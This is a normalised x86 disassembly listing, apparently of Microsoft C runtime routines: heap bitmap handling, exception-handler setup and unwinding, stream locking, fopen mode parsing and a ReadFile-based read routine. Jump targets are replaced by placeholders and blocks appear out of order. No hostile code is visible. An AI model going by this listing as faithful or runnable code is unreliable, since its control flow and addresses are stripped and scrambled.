and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10011783
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_100116d3
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10011e54
push sub_10011eb0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10011eb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c176
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c176
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10012730
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_100126e6
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000c176
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c176
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_10012716
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10012730
mov eax [ ebp + 0xc ]
push rw-data
call sub_10017320
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000c176
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_100126fd
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c176
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_10012042
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100159c7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_100159c7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10012113
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1001135a
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10012154
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1001135a
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10012186
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10011280
pop ecx
pop ebp
retn
sub_100121c2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10011280
pop ecx
pop ebp
retn
sub_100121f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_1001948f
add esp 0x14
test eax eax
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_10019619
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_100124ba
push 0x10
push r--data
call sub_10011e54
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100125e9
mov eax edi
call sub_10011e99
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_10015982
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_10017666
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_1000c3e9
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10012154
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_10011297
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_100121c2
pop ecx
pop ecx
sub_100125f4
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10012684
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10019749
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10019768
jmp r-xdata
sub_10012684
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000c176
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_100125f4
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100126e6
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10012716
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10012747
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_10018661
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10012f31
pop ecx
push eax
call sub_10012e34
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10012f31
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10012f31
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_10012f31
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10012f31
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_10012872
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_10010362
mov [ eax ] ebx
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10010362
mov [ eax ] ebx
call sub_1001034f
mov [ eax ] 0x9
jmp r-xdata
call sub_10010362
mov [ eax ] ebx
call sub_1001034f
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10015982
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100184c3
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1001034f
mov [ eax ] 0xc
call sub_10010362
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_10010375
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
